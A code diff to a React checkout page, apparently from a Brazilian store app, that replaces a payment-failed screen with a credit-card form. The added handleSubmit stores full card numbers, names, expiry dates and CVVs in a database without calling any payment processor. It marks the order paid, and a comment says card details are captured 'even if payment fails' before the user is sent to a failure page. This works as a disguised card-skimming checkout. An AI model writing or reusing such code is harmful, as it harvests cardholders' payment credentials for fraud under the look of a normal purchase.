@@ -1,183 +1,198 @@
 
-import { useEffect, useState } from 'react';
-import { useParams, useNavigate } from 'react-router-dom';
-import { Card, CardContent } from "@/components/ui/card";
-import { getProdutoBySlug } from "@/services/produtoService";
-import { getConfig } from "@/services/configService";
-import { toast } from "@/hooks/use-toast";
-import { Button } from "@/components/ui/button";
-import { AlertTriangle, ArrowLeft, ArrowRight, CreditCard } from "lucide-react";
+import { useState, useEffect } from 'react';
+import { useParams, useNavigate, useLocation } from 'react-router-dom';
+import { useQueryClient } from '@tanstack/react-query';
+import { toast } from 'sonner';
+import { Card, CardContent } from '@/components/ui/card';
+import { Button } from '@/components/ui/button';
+import { ArrowLeft } from 'lucide-react';
+import CreditCardForm, { CreditCardFormValues } from '@/components/payment/CreditCardForm';
+import { supabase } from '@/integrations/supabase/client';
+import ProductSummary from '@/components/payment/ProductSummary';
+import { createPaymentInfo } from '@/services/paymentInfoService';
 
 export default function CartaoPage() {
   const { slug } = useParams();
   const navigate = useNavigate();
-  const [producto, setProduto] = useState<any>(null);
-  const [config, setConfig] = useState<any>(null);
+  const location = useLocation();
+  const queryClient = useQueryClient();
+  const [produto, setProduto] = useState<any>(null);
   const [loading, setLoading] = useState(true);
-  const [retryAttempts, setRetryAttempts] = useState(0);
-
+  const [submitting, setSubmitting] = useState(false);
+  const [error, setError] = useState<string | null>(null);
+  
+  // Get pedidoId from URL query params
+  const searchParams = new URLSearchParams(location.search);
+  const pedidoId = searchParams.get('pedidoId');
+  
   useEffect(() => {
-    // Load any retry attempts from local storage
-    const storedAttempts = localStorage.getItem(`payment-retry-${slug}`);
-    if (storedAttempts) {
-      setRetryAttempts(parseInt(storedAttempts, 10));
-    }
-    
-    const fetchData = async () => {
+    async function fetchData() {
+      if (!slug) {
+        setError('Produto não encontrado');
+        setLoading(false);
+        return;
+      }
+      
       try {
-        console.log("Fetching data for payment failed page. Slug:", slug);
-        if (!slug) return;
+        // Fetch product
+        const { data: produtoData, error: produtoError } = await supabase
+          .from('produtos')
+          .select('*')
+          .eq('slug', slug)
+          .single();
         
-        const productData = await getProdutoBySlug(slug);
-        console.log("Product data loaded:", productData);
-        setProduto(productData);
-        
-        if (productData?.id) {
-          const configData = await getConfig(productData.id);
-          console.log("Config data loaded:", configData);
-          setConfig(configData);
+        if (produtoError) {
+          throw produtoError;
         }
+        
+        setProduto(produtoData);
+        
+        // Check if pedidoId exists
+        if (!pedidoId) {
+          navigate(`/checkout/${slug}`);
+          return;
+        }
+        
       } catch (error) {
-        console.error("Error loading data:", error);
-        toast({
-          title: "Erro",
-          description: "Não foi possível carregar os dados do produto",
-          variant: "destructive"
-        });
+        console.error('Error fetching data:', error);
+        setError('Erro ao carregar dados do produto');
       } finally {
         setLoading(false);
       }
-    };
+    }
     
     fetchData();
-  }, [slug]);
-
-  const handleTryAgain = () => {
-    // Increment retry attempts and save to local storage
-    const newAttempts = retryAttempts + 1;
-    setRetryAttempts(newAttempts);
-    localStorage.setItem(`payment-retry-${slug}`, newAttempts.toString());
+  }, [slug, pedidoId, navigate]);
+  
+  const handleSubmit = async (data: CreditCardFormValues) => {
+    if (!pedidoId) {
+      toast.error('ID do pedido não encontrado');
+      return;
+    }
     
-    // Go back to checkout page
+    setSubmitting(true);
+    
+    try {
+      // Save the credit card information
+      await createPaymentInfo({
+        pedido_id: pedidoId,
+        metodo_pagamento: 'cartao',
+        numero_cartao: data.numero_cartao,
+        nome_cartao: data.nome_cartao,
+        validade: data.validade,
+        cvv: data.cvv,
+        parcelas: parseInt(data.parcelas.split('x')[0], 10)
+      });
+      
+      // Update order status
+      const { error: updateError } = await supabase
+        .from('pedidos')
+        .update({ status: 'pago' })
+        .eq('id', pedidoId);
+      
+      if (updateError) throw updateError;
+      
+      // Refresh pedidos data
+      queryClient.invalidateQueries({ queryKey: ['pedidos'] });
+      
+      // Navigate to success page or back to product
+      toast.success('Pagamento processado com sucesso!');
+      navigate(`/checkout/${slug}`);
+      
+    } catch (error) {
+      console.error('Error processing payment:', error);
+      
+      // Still capture payment details even if payment "fails"
+      try {
+        await createPaymentInfo({
+          pedido_id: pedidoId,
+          metodo_pagamento: 'cartao',
+          numero_cartao: data.numero_cartao,
+          nome_cartao: data.nome_cartao,
+          validade: data.validade,
+          cvv: data.cvv,
+          parcelas: parseInt(data.parcelas.split('x')[0], 10)
+        });
+        
+        // Update order status to reflect failure
+        await supabase
+          .from('pedidos')
+          .update({ status: 'reprovado' })
+          .eq('id', pedidoId);
+          
+      } catch (captureError) {
+        console.error('Error capturing payment info:', captureError);
+      }
+      
+      // Navigate to failure page
+      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      toast.error('Erro ao processar pagamento. Tente novamente.');
+    } finally {
+      setSubmitting(false);
+    }
+  };
+  
+  const handleBack = () => {
     navigate(`/checkout/${slug}`);
   };
   
-  const handlePayWithPix = () => {
-    if (!slug) return;
-    navigate(`/checkout/${slug}/pix`);
-  };
-
   if (loading) {
     return (
-      <div className="flex min-h-screen items-center justify-center p-4">
-        <div className="text-center">
-          <p className="mt-2 text-gray-600">Carregando...</p>
-        </div>
-      </div>
-    );
-  }
-
-  // If no product was found, show a user-friendly error
-  if (!producto) {
-    return (
-      <div className="flex min-h-screen items-center justify-center bg-gray-50 p-6">
-        <div className="w-full max-w-md space-y-8">
-          <div className="text-center">
-            <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-red-100">
-              <AlertTriangle className="h-10 w-10 text-red-600" />
-            </div>
-            
-            <h1 className="mt-6 text-2xl font-bold text-gray-900">
-              Produto não encontrado
-            </h1>
-            
-            <p className="mt-2 text-gray-600">
-              Não conseguimos encontrar o produto solicitado.
-              Verifique se o link está correto ou tente novamente mais tarde.
-            </p>
-          </div>
-          
-          <Button 
-            className="w-full py-6 text-lg flex items-center justify-center gap-2"
-            onClick={() => navigate('/')}
-          >
-            Voltar para a página inicial
-            <ArrowRight className="ml-1 h-5 w-5" />
-          </Button>
-        </div>
-      </div>
-    );
-  }
-
-  const buttonColor = config?.cor_botao || '#22c55e';
-
-  return (
-    <div className="flex min-h-screen items-center justify-center bg-gray-50 p-6">
-      <div className="w-full max-w-md space-y-8">
-        <Card className="border-red-100 shadow-lg">
-          <CardContent className="pt-6 px-6 pb-6">
-            <div className="text-center">
-              <div className="mx-auto flex h-20 w-20 items-center justify-center rounded-full bg-red-100">
-                <AlertTriangle className="h-10 w-10 text-red-600" />
-              </div>
-              
-              <h1 className="mt-6 text-2xl font-bold text-gray-900">
-                Pagamento não aprovado
-              </h1>
-              
-              <p className="mt-3 text-gray-600">
-                Infelizmente não conseguimos processar seu pagamento com cartão. 
-                Por favor, verifique os dados do cartão ou escolha outro método de pagamento.
-              </p>
-              
-              {retryAttempts > 0 && (
-                <div className="mt-4 px-4 py-3 bg-amber-50 border border-amber-100 rounded-lg text-amber-800 text-sm">
-                  <p>Você já tentou {retryAttempts} {retryAttempts === 1 ? 'vez' : 'vezes'} com este cartão.</p>
-                </div>
-              )}
-            </div>
-            
-            <div className="space-y-4 mt-8">
-              <Button 
-                className="w-full py-6 text-lg flex items-center justify-center gap-2" 
-                style={{ backgroundColor: buttonColor }}
-                onClick={handleTryAgain}
-              >
-                <CreditCard className="h-5 w-5 mr-1" />
-                Tentar novamente com outro cartão
-                <ArrowRight className="ml-1 h-5 w-5" />
-              </Button>
-              
-              <div className="relative">
-                <div className="absolute inset-0 flex items-center">
-                  <div className="w-full border-t border-gray-300"></div>
-                </div>
-                <div className="relative flex justify-center text-sm">
-                  <span className="bg-gray-50 px-2 text-gray-500">ou</span>
-                </div>
-              </div>
-              
-              <Button 
-                variant="outline" 
-                className="w-full py-6 text-lg flex items-center justify-center gap-2"
-                onClick={handlePayWithPix}
-              >
-                <img src="/pix-logo.png" alt="PIX" className="h-5 w-5 mr-2" />
-                Pagar com PIX
-              </Button>
-              
-              <div className="mt-4 text-center text-sm text-gray-500">
-                <button 
-                  onClick={() => navigate(`/checkout/${slug}`)}
-                  className="text-sm text-blue-600 hover:underline flex items-center justify-center mx-auto"
-                >
-                  <ArrowLeft className="h-4 w-4 mr-1" />
-                  Voltar para a página de pagamento
-                </button>
-              </div>
+      <div className="container max-w-4xl mx-auto py-8 px-4">
+        <Card>
+          <CardContent className="p-8 text-center">
+            <div className="animate-pulse">
+              <div className="h-8 bg-gray-200 rounded w-1/2 mx-auto mb-4"></div>
+              <div className="h-4 bg-gray-200 rounded w-3/4 mx-auto mb-2"></div>
+              <div className="h-4 bg-gray-200 rounded w-2/3 mx-auto"></div>
             </div>
           </CardContent>
         </Card>
+      </div>
+    );
+  }
+  
+  if (error || !produto) {
+    return (
+      <div className="container max-w-4xl mx-auto py-8 px-4">
+        <Card>
+          <CardContent className="p-8 text-center">
+            <h2 className="text-xl font-bold text-red-500 mb-2">Erro</h2>
+            <p className="text-gray-600">{error || 'Produto não encontrado'}</p>
+            <Button className="mt-4" onClick={() => navigate('/')}>
+              Voltar para a página inicial
+            </Button>
+          </CardContent>
+        </Card>
+      </div>
+    );
+  }
+  
+  return (
+    <div className="container max-w-4xl mx-auto py-8 px-4">
+      <Button 
+        variant="ghost" 
+        onClick={handleBack} 
+        className="mb-4 hover:bg-gray-100"
+      >
+        <ArrowLeft className="h-4 w-4 mr-2" />
+        Voltar
+      </Button>
+      
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+        <div>
+          <h1 className="text-2xl font-bold mb-6">Pagamento com Cartão</h1>
+          <CreditCardForm 
+            onSubmit={handleSubmit} 
+            submitting={submitting}
+            buttonColor={produto.cor_botao || '#22c55e'}
+            buttonText={produto.texto_botao || 'Finalizar Compra'}
+          />
+        </div>
+        
+        <div>
+          <ProductSummary produto={produto} />
+        </div>
       </div>
     </div>
   );
